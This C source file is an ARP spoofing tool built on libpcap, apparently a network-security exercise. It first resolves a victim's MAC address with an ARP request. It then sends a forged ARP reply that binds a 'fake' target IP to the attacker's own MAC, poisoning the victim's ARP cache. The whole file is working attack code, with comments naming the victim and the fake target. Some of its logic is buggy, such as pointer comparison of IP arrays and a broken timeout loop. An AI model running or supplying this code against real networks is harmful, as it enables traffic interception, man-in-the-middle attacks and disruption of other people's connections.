#include "send_arp.h"

int main(int argc, char *argv[]) {
	//uint8_t* my_ether, sender_ether;
	uint8_t my_ether[6], sender_ether[6];
	//uint8_t *target_ether  : no need.
	//struct ARP_Header arp_hd, fake_arp_hd;
	struct rq_packet rq_p;
	char *dev;
	uint8_t my_ip[4];
	uint8_t send_ip[4];
	uint8_t target_ip[4];

	char errbuf[PCAP_ERRBUF_SIZE];
	uint8_t broadcast_ether[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	//step zero.
	if(argc<4) {
		//Should have syntax: send_arp <interface> <send ip> <target ip>
		usage(); 
		return -1;
	}
	printf("MY Interface : %s\n", argv[1]);
	// NOTICE.  sender recieves arp reply. 
	printf("Sender(victim) IP : %s\n", argv[2]);
	printf("FAKE Target IP : %s\n", argv[3]);
	dev = argv[1];
	inet_aton(argv[2], (in_addr *)send_ip);
	inet_aton(argv[3], (in_addr *)target_ip);
	get_dev_ether_addr(my_ether, dev);
	print_ether(my_ether);
	get_dev_ip_addr(my_ip, dev);
	printf("my ip ");
	print_ip(my_ip);

	/* 3 steps.
	1. send ARP reques
	2. receive ARP reply
	3. send ARP reply
	*/

	//1 send ARP request
	memcpy(rq_p.arp_p.dest_ip_addr, send_ip, 4);
	memcpy(rq_p.arp_p.source_ip_addr, my_ip, 4);
	memcpy(rq_p.eth_header.ether_shost, my_ether, 6);
	memcpy(rq_p.eth_header.ether_dhost, broadcast_ether, 6);
	memcpy(rq_p.arp_p.source_ether_addr, my_ether, 6);
	memcpy(rq_p.arp_p.dest_ether_addr, broadcast_ether, 6);
	rq_arp(&rq_p); // make the rest of request packet

	//print request packet
	printf("---------------ethernet protocol--------------------\n");
	print_ether(rq_p.eth_header.ether_dhost);
	print_ether(rq_p.eth_header.ether_shost);
	printf("ether type : 0x%04x\n", htons(rq_p.eth_header.ether_type));

	printf("---------------arp protocol--------------------\n");
	printf("Hardware type : 0x%04x\n", htons(rq_p.arp_p.arp_hw));
	printf("Protocol type : 0x0%x\n", htons(rq_p.arp_p.arp_pro));
	printf("Hardware size : %d\n", rq_p.arp_p.arp_hlen);
	printf("Protocol size : %d\n", rq_p.arp_p.arp_plen);
	printf("Opcode : %d\n", rq_p.arp_p.arp_op);
	printf("Source ");
	print_ether(rq_p.arp_p.source_ether_addr);
	printf("Destination ");
	print_ether(rq_p.arp_p.dest_ether_addr);
	printf("Source ip ");
	print_ip(rq_p.arp_p.source_ip_addr);
	printf("Destination ip ");
	print_ip(rq_p.arp_p.dest_ip_addr);

	// send packet
	pcap_t* handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	int tmp;
	struct libnet_ethernet_hdr *tmp_eth;
	const uint8_t *get_packet;
	struct pcap_pkthdr *header;
	struct ARP_Header *tmp_arp;

	int timeout = 10;
	while(timeout != 0) {
		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));

		while(1) {
			tmp = pcap_next_ex(handle, &header, &get_packet);
			if(tmp<1) continue;
			tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
			if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
			tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
			if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2 ) {
				if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
					memcpy(sender_ether, tmp_arp->source_ether_addr, 6);
					break;
				}
				else if(timeout == 0) {
					perror("Timeout ARP request Fail\n");
				}
				else timeout--;
			}
		}
	}
	
	printf("Sender ethernet address :");
	print_ether(sender_ether);

	//3. send ARP reply
	struct rq_packet rp_p; //reply packet
	memcpy(rp_p.eth_header.ether_shost, my_ether, 6);
	memcpy(rp_p.eth_header.ether_dhost, sender_ether, 6);

	memcpy(rp_p.arp_p.dest_ip_addr, send_ip, 4);
	memcpy(rp_p.arp_p.source_ip_addr, target_ip, 4);

	memcpy(rp_p.arp_p.source_ether_addr, my_ether, 6);
	memcpy(rp_p.arp_p.dest_ether_addr, sender_ether, 6);
	rp_p.arp_p.arp_op = htons(2); //reply

	pcap_sendpacket(handle, (uint8_t *)&rp_p, sizeof(rp_p));

	return 0;
}
